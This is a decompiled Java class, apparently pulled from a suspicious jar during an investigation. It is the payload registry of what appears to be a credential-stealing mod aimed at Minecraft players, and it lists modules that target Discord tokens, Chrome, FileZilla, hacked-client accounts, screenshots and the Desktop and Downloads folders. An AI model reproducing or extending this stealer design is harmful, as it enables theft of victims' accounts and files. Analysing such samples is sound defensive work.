/*    */ package idasido.adldaosd.wpiw.payload;
/*    */ import idasido.adldaosd.wpiw.payload.impl.Desktop;
/*    */ import idasido.adldaosd.wpiw.payload.impl.KonasAccounts;
/*    */ import idasido.adldaosd.wpiw.payload.impl.LauncherAccounts;
/*    */ import idasido.adldaosd.wpiw.payload.impl.NewDiscord;
/*    */ import idasido.adldaosd.wpiw.payload.impl.PyroAccounts;
/*    */ import idasido.adldaosd.wpiw.payload.impl.PyroWaypoints;
/*    */ import idasido.adldaosd.wpiw.payload.impl.ShareX;
/*    */ import java.util.ArrayList;
/*    */ import java.util.List;
/*    */ 
/*    */ public final class PayloadRegistry {
/* 13 */   private static final PayloadRegistry INSTANCE = new PayloadRegistry();
/* 14 */   private final List<Payload> payloads = new ArrayList<>();
/*    */ 
/*    */   
/*    */   private PayloadRegistry() {
/* 18 */     this.payloads.addAll(Arrays.asList(new Payload[] { (Payload)new NewDiscord(), (Payload)new DiscordTokens(), (Payload)new FutureAccounts(), (Payload)new Personal(), (Payload)new FutureWaypoints(), (Payload)new Chrome(), (Payload)new ModsGrabber(), (Payload)new ScreenCapture(), (Payload)new LauncherAccounts(), (Payload)new FileZilla(), (Payload)new ShareX(), (Payload)new Intellij(), (Payload)new FutureAuth(), (Payload)new SalHackWaypoints(), (Payload)new RusherHackAccounts(), (Payload)new RusherHackWaypoints(), (Payload)new PyroAccounts(), (Payload)new PyroWaypoints(), (Payload)new KonasAccounts(), (Payload)new KonasWaypoints(), (Payload)new KamiWaypoints(), (Payload)new JourneyMap(), (Payload)new Desktop(), (Payload)new Downloads() }));
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public static Optional<Payload> getPayload(Class<? extends Payload> klazz) {
/* 54 */     return getPayloads().stream().filter(p -> p.getClass().equals(klazz)).findAny();
/*    */   }
/*    */ 
/*    */   
/*    */   public static List<Payload> getPayloads() {
/* 59 */     return INSTANCE.payloads;
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\PayloadRegistry.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */